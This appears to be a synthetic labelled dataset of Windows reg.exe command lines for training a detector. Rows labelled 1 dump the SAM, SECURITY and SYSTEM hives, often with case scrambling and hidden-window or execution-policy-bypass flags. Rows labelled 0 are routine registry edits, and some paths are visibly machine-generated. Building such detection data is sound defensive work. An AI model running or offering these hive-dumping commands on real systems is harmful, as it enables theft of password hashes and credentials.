text,label
pWSH -NopROfiLe -C REg   eXPort hKEY_LoCaL_MAchiNe\System   c:\WInDOWs\TeMP\SAm.SAve   /y,1
"REg.exE adD ""HkeY_loCAl_mACHINe\coNTROL panEl\DeSKtOp"" /V VERSION /t REg_sz /D ""1.0.0""",0
"REG  uNlOAD  ""hKU\SofTWarE\clASSES""  /F",0
"cmd /c powershell -c ""reg.exe export  hklm\security   c:\users\public\registry_export.reg   /y""",1
"reG.EXE   SAVE   ""HKEY_CurREnt_useR\sOftwarE\microSOfT\winDows\CUrrEnTveRsIon\sUBKeY33""   ""D:\bACKUp\REGiStRy_HiVE.dAt""",0
"Reg.eXE DELetE ""hkey_LoCAL_MAchINE\hkEy_LoCaL_mAcHiNe\sYsteM\cURRentcoNTROLSeT\cONtROL\subkEY39""",0
C:\wiNDOws\sYSTEM32\cMd.exE /k reg   exporT  HKEY_LOcal_MacHiNe\SEcurity \\lOCaLHOST\c$\__DuMp\SaM.Bak /y,1
"rEg   dELeTE   ""HKEy_usErS\sySTEm\cUrREnTCONtroLsEt\SERvICeS""   /v path",0
"reg   query   ""hkcu\software\myapp\settings\subkey34""   /v path",0
POWerShELl -ExEC bypass -w HidDen -c reg.Exe   sAVE   HKLm\securITY   %TeMP%\SEC_baCKuP.daT  /Y,1
reG SAve   HkEy_LoCaL_MaChiNe\sECUriTy  \.\c$AcKUp.Reg,1
reg   save hklm\system c:\temp\system.hive,1
cmD.exE /C StART /B rEg sAve   HkeY_locAl_macHinE\SecuRiTy   C:\TEmP\sYSTem.hIVe  /y,1
"POWeRshELl -c Reg  query  ""hKEY_CurRenT_USER\softWArE\mYAPP\SetTiNgs\SuBkey13""  /V pATH",0
pOWErsHELL -eXeC BYpASs -W hidDeN -C REG  exPort  HKEy_LOCal_mAChINE\SySTeM  c:\WiNdoWS\tEmP\saM.sAVe,1
"rEG   add   ""hKEY_CURRenT_USER\SOftWARe\polICIEs\mYcoRP""   /V lastUPdAtE   /t REg_sZ   /D 1",0
PoWERshELl -ComMAnd ReG  eXPOrt hKEY_LoCAl_machIne\sECuRitY C:\WInDoWS\tEmP\sAM.SAVe  /y,1
c:\windOwS\SYSTem32\CmD.exE /k reG   save HkLm\sysTem  \.\c$aCkUp.ReG  /y,1
C:\WINDoWs\SYstem32\cmd.EXE /k rEg.exE  export   HkLm\SYSTeM   \.\C$AcKUp.rEg /y,1
pwsh -noprofile -c reg.exe  export hklm\security \\localhost\c$\__dump\sam.bak /y,1
"powershell -c reg  add  ""hku\software\classes""  /v version  /t reg_sz  /d ""1.0.0""",0
"StaRt /b REG.EXe save ""hkey_LocAL_MAcHINE\Hkey_LOCaL_MAChINe\sysTeM\CURReNtcONtRolseT\COntRoL"" ""%tEmp%\Non_seNSITIVe.HIve""",0
"reg.exe  compare  ""hku\software\microsoft\windows\currentversion\subkey17""  ""hku\hkey_local_machine\software\wow6432node_727""",0
"reg.exe restore ""hkey_local_machine\control panel\desktop"" ""hkey_local_machine\software\classes_444""",0
cmd.exe /c start /b reg.exe save  hkey_local_machine\system  \\localhost\c$\__dump\sam.bak,1
powerSHElL -exEc BYpass -w hIdDEN -C rEG.EXe ExPorT HKeY_LOcAl_mAchinE\SECURITy   c:\usErS\pUbLic\REgIsTry_expORt.reG,1
ReG.exE sAvE hkLm\sAm  C:\TemP\sYsTeM.HIVe,1
"REg.Exe cOMPare ""Hku\sOFTwaRE\PolIcIes\myCoRP\subKeY98"" ""hKU\SofTwaRE\gOoGLE\cHROmE_923""",0
c:\winDOWS\sYsTEM32\cmD.eXE /k reG.Exe ExPORt HKEy_lOcal_mAchINE\SEcURiTY   C:\TEMP\SysTem.HivE,1
"cmd /c powershell -c ""reg.exe   export   hklm\sam   \\localhost\c$\__dump\sam.bak""",1
"ReG  adD  ""hKU\sOfTWaRE\Myapp\sETTInGS""  /V PaTH  /t REG_DwOrd  /D ""1.0.0""",0
CmD.EXe /C rEg.exE sAvE  hKLM\sam c:\WIndowS\TEmp\sam.SaVe /Y,1
"reg.exe   compare   ""hkey_local_machine\software\google\chrome\subkey12""   ""hkey_local_machine\system\currentcontrolset\services_283""",0
"reG.exE rEstORe ""HkEy_userS\sOFTWArE\CLAsSes\subkey56"" ""Hkey_usERs\enViroNMENt_777""",0
"rEg.EXE   aDd   ""HKu\SOfTWARe\MicROSOFT\wiNdowS\CurrENTvERSion""   /v path",0
powershell -exec bypass -w hidden -c reg.exe  save  hklm\system   \\localhost\c$\__dump\sam.bak,1
pOwerSheLL -CoMmAnD REg.EXe Save  HklM\SYsTem C:\wINdOWs\temP\saM.sAVE  /Y,1
"poweRShElL -c rEG   UnLoaD   ""HKEy_local_machINE\SOftwArE\mYAPP\SETTiNGS""",0
"ReG.eXe  CoMPARe  ""HKcU\SoftWArE\gOogLE\cHrOMe""  ""hkcU\hKEY_lOCAL_MAcHiNe\SYsTeM\CUrrenTconTRoLSeT\CoNtrOL_254""",0
"powershell -c reg compare ""hkey_users\system\currentcontrolset\services\subkey17"" ""hkey_users\system\currentcontrolset\services_945""",0
rEG  sAVE  hkEy_Local_mACHinE\SaM  C:\TEmP\SYSteM.HiVe,1
cmd.EXE /C rEg.exE  sAVe   hklm\sYSTEm  c:\uSErS\PUbLIC\REgisTry_ExPOrT.REg  /y,1
pWSh -noPRoFILe -c rEG  saVE  hKeY_LocAL_MacHine\SAm \.\C$acKup.rEG /y,1
"reg aDd ""hku\sOfTWARe\pOlICIeS\myCORP\SUBKeY53""  /T rEg_Sz /D ""1.0.0""",0
"CmD /c POwershEll -C ""rEg  eXporT  Hkey_locaL_MAChIne\sAm C:\TemP\sYStEM.HIvE""",1
"sTarT /b reG   rEsTore   ""HKEY_UsErS\soFtWAre\miCrOSOFT\wiNdows\cUrRentVeRSION""   ""HKEy_USErs\SOftwArE\gOOgLe\cHroMe_919""",0
"REg.EXe QUEry ""hkeY_CURReNT_USER\cOnTroL PaneL\DeSKtoP"" /V LaStupdate",0
cMD.exe /c Reg.exe  exPoRT   HKEy_lOcAl_MAcHInE\sAm  \\LocalHoST\c$\__DuMp\SAM.BAk,1
powershell -command reg  export  hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
"Start /b reg.ExE  cOMPare  ""Hkey_CUrReNT_uSer\hkEY_LoCAL_MaChinE\SoFtwAre\wOw6432nOdE""  ""hkEY_CuRrEnT_uSer\sOfTwARe\pOLIcieS\MYcORP_505""",0
PoWERsHelL -COmMaNd REG   sAvE   HKlm\sYsTem c:\userS\PUBliC\reGisTRy_eXPort.reg,1
"rEG   cOPY   ""HKcu\system\cuRRentCOntrolsET\SERVICes""   ""HkcU\sYSTeM\curRenTCOntrOLSET\sERvIcEs_517""",0
powershell -command reg.exe export hkey_local_machine\system   c:\users\public\registry_export.reg  /y,1
"rEG.EXe  aDD  ""HKey_cURRenT_uSeR\Hkey_lOcAL_maChINE\sysTeM\CUrrENtCONTROLseT\coNtRoL""  /v verSIoN",0
"CMD /c REg  UNLOAd  ""hKCU\hkeY_locAl_MaChiNE\syStEm\CUrRENtCoNTrOlSEt\CONTRol\SUbKEy65""  /V lAstUPDatE",0
pwsH -NOpRofILe -C REg.EXE eXpoRT  hkLM\sECurITY   c:\wiNdOWs\TeMP\sAM.SavE,1
"reg.EXe  DelEte  ""hkEy_lOcAL_macHine\soFtWarE\PolICIES\mYcORp""  /V lASTUPDatE",0
PwSH -NOPRoFILe -C reg   Export   hkEy_LocAl_MAChInE\SECUriTy  \\lOCalHOST\c$\__dUmp\sAM.BaK,1
"powershell -c reg.exe   delete   ""hku\software\google\chrome""",0
powershell -exec bypass -w hidden -c reg.exe  save   hkey_local_machine\sam c:\windows\temp\sam.save,1
cmd.eXE /C StaRT /B ReG  savE   HKlm\secUrITy   c:\teMP\SyStEM.HivE /y,1
"STart /b rEG  queRy  ""Hku\hkey_LoCaL_maChine\syStEm\CurrentcONTRoLSEt\control\SubKeY91""",0
"start /b reg unload ""hkey_local_machine\system\currentcontrolset\services"" /v path",0
"cMD /C POWeRShELL -c ""rEG savE hkEy_LoCAl_MACHINe\sySteM c:\windOws\TEmP\SAm.SAve""",1
pwSh -NoprOfiLe -C rEg sAvE   HKeY_local_MaCHIne\SaM  c:\WIndOws\TeMP\Sam.saVe,1
"rEg coPY ""hkEY_cUrRenT_useR\sOftwaRE\miCROsofT\WIndOWs\cuRreNTverSIOn"" ""HkEY_CurRenT_USeR\ENviRonmENt_586""",0
"CMd /c POWerSHeLl -c ""rEG.Exe ExPoRt  HKLm\SecuriTy   \.\c$AcKUp.REG""",1
PWsH -nOPrOFiLE -C reg   expOrt  hkLM\Sam C:\wINdOws\temP\sAM.SaVe,1
"reG  SaVE  ""hKEY_LoCAL_MAChine\HkEY_LoCAl_MacHinE\sOFTWaRE\WOW6432node\subKeY69""  ""d:\BACkUp\rEGISTRY_HivE.dat""",0
"rEG.EXE  copY  ""hKu\sySTEM\cuRreNTcONTROLSet\SErViCES""  ""hku\soFTwaRE\policieS\MYCORp_826""",0
cmd.exe /c start /b reg   save   hkey_local_machine\sam   c:\windows\temp\sam.save,1
"cMd /c reg.ExE   CoMPare   ""hkcu\sYSTEM\CurReNtcONTrolSEt\serVICEs\Subkey88""   ""HKcu\hKey_LocAl_macHINe\SOFtwARe\PolICIes\mIcROsoFt_453""",0
PwSh -noproFiLe -c REG.ExE  sAVE hKlM\SyStem C:\wInDOwS\teMP\saM.sAve /y,1
powershell -command reg.exe  export  hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
"cmD /C powERSheLL -C ""rEG.ExE expoRt Hkey_LoCal_MaCHiNE\system   \.\C$AckuP.rEG""",1
"ReG   deLETe   ""Hkey_CUrreNt_user\SofTWaRE\CLaSsEs\sUbKey14""   /V LAsTupDate",0
Cmd.eXe /C REg   SaVe   HKLM\saM   \\loCalHOst\c$\__dUmp\SAm.BaK,1
"reG.exe  Add  ""Hku\sOfTwaRe\mYaPp\sEtTingS""  /v VeRSioN",0
"CmD /c POWeRSHelL -C ""Reg  SAvE   hKey_lOCAl_mAcHIne\saM  c:\TEMp\systeM.hivE /y""",1
"ReG.ExE   coPy   ""hKEy_CURrent_uSer\sOFtwarE\myaPp\seTtings\SubKEy6""   ""hkeY_cuRRENT_user\ENVirONment_490""",0
"sTArT /B rEg.Exe  QuEry  ""hkCU\hKeY_LoCAL_MAChINE\sOftwARe\pOlICiES\MIcRoSOfT""",0
cMd.ExE /c StarT /B ReG.eXe saVe  HKLm\SYSTeM c:\wInDOwS\TeMP\sAm.SAVE   /Y,1
"CMd /C rEg.Exe   RESToRe   ""hKEY_local_MachINE\hKEy_lOCal_mACHiNe\sySTeM\currENtCOntrolsET\coNtrOl\SUbkey55""   ""hKEy_locAL_mACHiNE\soFtWare\classeS_802""",0
"ReG.Exe   DEleTe   ""hkEY_CUrrENt_usEr\hKeY_locaL_MAchine\sOfTwARe\WOw6432NoDe""   /V VErsIOn",0
"cmd /c powershell -c ""reg.exe export hklm\security   c:\windows\temp\sam.save""",1
"reG  ReStOrE  ""HKEY_lOcaL_MachINe\SYsTEm\CurRENtCoNTrolSET\SeRViCeS""  ""hKEy_LOCal_mAcHIne\sOftwaRe\PoLiCies\mycoRP_355""",0
POwersHell -exEC BYpASS -w HIDDEn -C Reg exPORt  hKlM\secuRItY C:\uSERS\pUblIc\regISTry_EXpOrt.rEg,1
poWersHELl -COMmANd REG.eXE   SAVE hkEY_loCAl_macHine\sam   %tEmp%\SEC_backup.DAt,1
cmD.eXE /C STart /B REg  saVe   HKlM\SysTem  %TEmp%\SeC_BAckUP.DAt,1
"Reg uNlOAd ""HKEy_currENt_User\hkEY_LocaL_mAChiNE\soFTwAre\Wow6432NoDE"" /F",0
"cMd /c PoWeRsHEll -C ""ReG.exE   SaVe  HkLM\secuRity  C:\teMP\syStEM.HIVe   /y""",1
"rEg.EXe  dEleTE  ""hkEy_LOcaL_MaCHiNe\SoFTwAre\GoOgLe\CHRoME""  /v PATh",0
reg.exe export   hkey_local_machine\security   c:\windows\temp\sam.save,1
cMd.EXE /c sTaRT /b REg  Export   hklm\sAM C:\teMp\SYstEm.HIVE /Y,1
"reG  qUery  ""hkey_CurRENT_usER\SofTWAre\MiCrOSoFt\WiNDoWs\CUrrenTvERsIOn\SUbKEY8""  /V VeRSion",0
"cmd /c powershell -c ""reg  save   hkey_local_machine\security   %temp%\sec_backup.dat   /y""",1
"cmd /c reg.exe copy ""hkey_current_user\control panel\desktop\subkey27"" ""hkey_current_user\control panel\desktop_183""",0
pwsh -noprofile -c reg.exe save   hklm\system %temp%\sec_backup.dat  /y,1
REG.eXe   eXpORT hkey_local_macHINE\seCuRitY c:\users\PUBLiC\rEGIsTry_EXpOrT.reg /y,1
pwsh -noprofile -c reg  export  hklm\system   \\localhost\c$\__dump\sam.bak /y,1
c:\windows\system32\cmd.exe /k reg.exe  export  hklm\security   \.\c$ackup.reg /y,1
c:\windows\system32\cmd.exe /k reg.exe  export   hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak  /y,1
"REg uNloAD ""hKey_cuRreNT_usEr\SOFTWaRe\pOLiciES\MYcoRP""",0
CMD.eXE /C STart /b reg  SAVe   hKLM\sySteM  C:\tEMP\sySTeM.HIVE,1
"pOwerShELl -c rEg.eXe   DELETe   ""Hkey_LoCaL_maChInE\sOftware\PoLIcIES\mYCOrp""",0
"rEg.Exe  cOmparE  ""HKeY_cuRreNt_USEr\HkEy_LOcAl_MAcHiNe\sYsTem\cuRRENTConTrOlset\cONtROl\SUBkey30""  ""hKey_cURreNT_USER\SoFtwAre\GOOgle\cHRoME_678""",0
"reg.exe   query   ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control\subkey60""   /v path",0
powershell -command reg   save hkey_local_machine\security   \\localhost\c$\__dump\sam.bak   /y,1
"reg.eXE cOPy ""HkEY_CuRreNt_user\coNTroL PaNel\DesKTOP"" ""HKeY_cURrEnt_useR\SOFTWaRE\googLe\ChRoMe_743""",0
C:\WINDOws\SYstEM32\CMD.Exe /K Reg   EXporT   HKLM\SAm %temP%\seC_bacKUP.daT  /Y,1
poweRshEll -eXEC byPaSs -W hiDDeN -c REG.EXe  eXporT   hklM\SySteM   %teMp%\sEc_bACkup.daT,1
cmd.exe /c start /b reg.exe export hkey_local_machine\security   c:\temp\system.hive,1
POwersHeLl -commAND ReG.ExE  EXPOrt  HKlM\sam %teMp%\SEC_BacKUP.Dat  /Y,1
PoWERSheLl -eXeC BYpAss -w HidDeN -c rEg.Exe SAVe   hKLM\SAM   \.\c$AckUp.reg /y,1
c:\winDoWS\sySTem32\cMd.EXE /K Reg.exe export HKlM\SeCurity  \.\c$aCkup.REg,1
"stArt /b rEG.exE RESTORe ""hkCU\soFtWARE\googLe\CHroMe"" ""hKCu\HkeY_LocAl_MachiNE\sYstEM\curReNtContRoLSeT\cOnTroL_432""",0
"STArT /b ReG save ""hkey_LOCaL_MAcHIne\softwAre\poLIcies\MYcORP\SuBKEy9"" ""d:\backup\RegiStrY_hIvE.dat"" /Y",0
reg.exe export hklm\system c:\windows\temp\sam.save,1
rEg.EXE  EXpORt  HKlm\sySTem   \.\C$acKuP.Reg,1
cMD.EXe /C StaRt /b ReG  ExPORt  hklm\SECUrIty c:\wINDoWS\TeMP\saM.saVE   /Y,1
"reg.exe  unload  ""hkcu\control panel\desktop""  /v lastupdate",0
"CMD /C pOwErsHeLL -C ""ReG SaVe  hKLM\SYstEm C:\teMp\sYStEM.hivE  /Y""",1
powershell -command reg   export hklm\sam %temp%\sec_backup.dat  /y,1
CMd.eXE /c StaRT /b ReG.eXE  expoRT HKey_lOCaL_MaChINE\SAm C:\wINdoWs\TEmP\SAM.sAve,1
"powershell -c reg   add   ""hkey_users\software\myapp\settings\subkey32""      /t reg_sz",0
"powershell -c reg.exe save ""hku\system\currentcontrolset\services\subkey33"" ""d:\backup\registry_hive.dat""",0
"STArT /B reg.EXE   aDd   ""hKeY_LOCaL_machine\HKeY_LocaL_mACHinE\sYstem\CURReNtCOnTrOlsET\CoNTROL\subKey5""      /t REg_sz   /D ""C:\prOGRAm FILES\App""",0
"reg.exe  copy  ""hku\software\myapp\settings\subkey36""  ""hku\software\classes_886""",0
PWSH -NoProfILE -c rEg SAvE hkLM\sEcURITy   c:\Users\pUBlic\ReGIstry_EXport.rEG,1
PwSH -nOpRoFILe -c reG expOrT  hKey_locAL_mAchiNE\SAm   c:\tEMP\SYSTeM.hiVe,1
reG   sAVe hKLM\SecurITy C:\teMp\system.HIve  /y,1
"rEg.eXe  DeLEte  ""HKeY_USErS\sOFTware\CLassES\SubKEy46""  /V lASTUPdAte",0
Reg  EXpoRT  hKlM\sAm  %TeMP%\SEC_Backup.dAt,1
"start /b reg   add   ""hkcu\software\google\chrome\subkey90""   /f      /d ""1.0.0""",0
reg.exe  save  hkey_local_machine\system   c:\users\public\registry_export.reg /y,1
powershell -command reg export   hkey_local_machine\security  %temp%\sec_backup.dat /y,1
powershell -exec bypass -w hidden -c reg.exe   save hkey_local_machine\system   \\localhost\c$\__dump\sam.bak   /y,1
"ReG.Exe   UnLoAD   ""hKEY_CuRrENT_uSEr\SoftWARe\PolICIeS\mYcoRP\SuBKEy22""   /v versIon",0
"reg.exe delete ""hkcu\software\myapp\settings"" /v version",0
"reg   delete   ""hkcu\system\currentcontrolset\services\subkey56""   /v path",0
"rEG.exE ADD ""hKeY_cUrrent_uSEr\ENvironMent\sUbkey88"" /V lasTUpDate  /d ""1.0.0""",0
cmD.EXE /c reG Save   hkey_LoCAl_MAcHiNE\security \.\C$aCkup.rEG,1
pOweRshEll -EXEc BypaSS -W hIDdEn -c reg.ExE  ExPOrT HKEY_LOCAL_maCHinE\sySTeM  c:\winDOws\TeMP\sam.SAvE,1
reg.exe  save  hklm\system   %temp%\sec_backup.dat  /y,1
"rEG COmpaRE ""hkEY_LocAl_MaCHinE\SofTWarE\GOoGlE\ChROme\sUbKEY41"" ""HKEY_lOCAl_Machine\SofTwarE\MYApp\SettiNGs_321""",0
Cmd.EXe /c Reg  ExpoRT HkEY_LoCAl_MACHINe\SAm  \.\c$acKuP.ReG  /y,1
"rEg   DeLEte   ""HkeY_usERs\HkeY_local_mACHine\sOftWaRe\PoLiCIEs\mIcrOSOFt""   /v pAth",0
"poWershell -c rEG.eXE   REsToRE   ""hKEy_LOCaL_MacHine\cOntrOl pAnEl\DEsktoP\SUBkey75""   ""hkEy_LoCAL_MaCHINE\hKeY_LOcAl_MachiNE\sOftwaRE\WOW6432NODE_448""",0
"REG.EXe restORE ""HKEy_CurreNT_USEr\SofTwARe\myAPp\SettINGs"" ""Hkey_CURrEnt_USer\SOftwArE\MyaPp\SEtTiNgs_480""",0
"cmd /c Reg   dELeTE   ""HkEY_loCal_MAChIne\sOFtWARe\cLASSeS\SUBkEy99""   /v VeRSiOn",0
"STaRT /b REg  aDd  ""hKey_USERS\SoFTWARe\POLIcIES\myCOrp\subKeY100""  /f    /D ""c:\proGrAm FIleS\aPp""",0
cMd.eXE /c reg.ExE eXPorT  Hklm\SeCURITy  \.\C$aCKuP.Reg,1
"ReG comPaRe ""HKU\HkeY_lOCAL_mAChINe\SoftwAre\poliCiEs\MIcroSoFt\suBKEy90"" ""HkU\sofTwarE\PolIcIes\mYCORp_646""",0
cMD.eXe /c reg SaVE hKlM\Sam  C:\tEmp\SYStEM.HiVE,1
"REG quErY ""hku\SOFtwaRe\MYAPp\setTiNgs"" /v lAStupdAte",0
"reG SAve ""hKey_uSeRS\HKEy_loCAL_mACHINE\sysTEm\CURRENTCOnTrolSET\cONTrOl"" ""C:\uSeRS\PUblIC\cHRome_dATA.bak"" /y",0
reg.exe save  hklm\sam   c:\temp\system.hive /y,1
c:\winDOws\SYSTeM32\cMD.exE /k rEg   ExpoRt HkeY_LoCAl_machINe\SYSteM \.\c$ACKup.REG,1
"reg.exe  query  ""hkey_local_machine\control panel\desktop\subkey55""",0
"reg.exe UnLoAD ""HkeY_CURReNT_USEr\SOfTWArE\GoOGle\ChRoMe"" /f",0
CMd.Exe /C rEg  sAVe  HklM\sAM  C:\TeMP\SYStEm.HiVe   /y,1
c:\windows\system32\cmd.exe /k reg.exe  save   hklm\system   %temp%\sec_backup.dat  /y,1
"ReG querY ""hKEy_uSErs\SofTwArE\miCROSOft\wInDOWS\cUrRENTvERSION"" /V lASTUPDaTE",0
cmd.exe /c start /b reg  save hklm\security   \.\c$ackup.reg   /y,1
"reg   COMparE   ""hkU\hKeY_lOcal_maCHinE\sySTEM\curREntcOntROLseT\conTRol\suBKEy50""   ""hkU\SoFTwARe\cLASseS_336""",0
"cMD /C pOweRshelL -C ""rEg.ExE  expoRT   hKey_LOCaL_maChInE\SECurity C:\wINdowS\tEMP\saM.sAVe""",1
"REG  QuEry  ""Hku\sOFTwARE\mIcrosoFT\wIndowS\CurreNTvERSiON""  /v PAth",0
c:\WINDowS\sYSTeM32\cMd.Exe /K rEg SaVE   hKlm\SecuRItY   c:\TEMP\SySTEm.hive   /y,1
REG sAvE   HkLM\SaM C:\TEMp\SYSTem.hiVE,1
CMD.Exe /c ReG.exe  ExPOrt   hKlM\saM c:\wINdOWS\TEMP\sAm.sAve   /y,1
"REG   Add   ""hkey_uSeRs\HkeY_LoCAL_maCHINe\sOFtwARE\POliCIeS\miCRosOfT""   /F   /T REG_DWord   /d ""1.0.0""",0
"REG QuerY ""HKcU\hKEY_lOCaL_MacHINE\softWArE\wOW6432NOdE"" /v VErsiOn",0
"REg CoMPaRE ""hkCU\SoFtwArE\GoOGlE\cHrOME"" ""HKcU\sOfTWaRe\myApp\sEtTingS_217""",0
powershell -command reg.exe save   hkey_local_machine\security   c:\users\public\registry_export.reg,1
"REG.ExE   aDd   ""hKey_CuRrENT_User\hKey_LOCAL_MaChine\SofTWaRE\POlICies\MiCrOSoFT\suBKEy17""   /V VerSiON   /t rEG_DwoRD",0
"reg.exe  add  ""hkey_current_user\software\policies\mycorp\subkey84""  /v version  /t reg_sz",0
PowErShell -exEC bYpAss -W HIDden -C REG.eXE   Save  HKLm\SecurITy \\LOCALhoSt\c$\__Dump\saM.BaK,1
REG.ExE SAVe Hklm\saM C:\wiNDOWs\TeMP\SaM.SAVE,1
pOwErshELl -COmmand rEG.EXE exPORt   hKlm\SeCurity  %tEmp%\SeC_BackuP.DaT /Y,1
"rEg  quEry  ""HkEY_Local_mACHInE\soFTwarE\MYAPp\seTtinGs""  /V VerSiON",0
"starT /B REG   SAvE   ""HkEy_CUrrEnT_USer\soFtwARe\MyaPp\sETTIngS\SUBKey51""   ""c:\TeMp\User_SettIngS.REg""",0
"reg compare ""hkey_local_machine\hkey_local_machine\software\wow6432node"" ""hkey_local_machine\software\myapp\settings_255""",0
"STARt /b rEG.exE   copY   ""HkeY_local_machine\Hkey_loCal_mACHiNe\sOftwaRe\POliCieS\miCROsoFt""   ""Hkey_lOCAl_MaChinE\HKEY_LocAl_MAChINe\softWarE\WoW6432NODE_246""",0
cMD.exE /c REg.EXe  SAve  hKEy_locAl_mAcHINE\sAM  \.\C$ACkUp.rEg   /Y,1
